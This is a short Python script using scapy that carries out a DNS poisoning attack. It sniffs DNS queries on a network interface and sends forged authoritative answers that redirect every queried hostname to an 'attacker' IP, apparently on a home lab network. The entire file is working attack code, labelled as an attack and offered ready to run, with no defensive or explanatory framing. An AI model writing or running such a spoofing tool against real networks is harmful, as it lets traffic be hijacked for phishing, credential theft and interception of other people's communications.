from scapy.all import *

IFACE = "\\Device\\NPF_{893D45BA-2CDB-421D-B887-F184ACEB8DDB}"

# Attacker IP (your Windows machine)
attacker_ip = "192.168.56.1"

def dns_poison(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
        queried_host = pkt[DNS].qd.qname.decode()
        
        print(f"[*] Intercepted DNS query for: {queried_host}")
        
        # Send fake DNS response
        dns_response = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=10,
                    rdata=attacker_ip
                )
            )
        )
        send(dns_response, verbose=False, iface=IFACE)
        print(f"[*] Poisoned! Redirected {queried_host} to {attacker_ip}")

print("[*] Starting DNS Poisoning attack...")
print(f"[*] Redirecting all DNS queries to: {attacker_ip}")
print("[*] Listening for DNS queries...")
print("[*] Press Ctrl+C to stop\n")

sniff(filter="udp port 53", prn=dns_poison)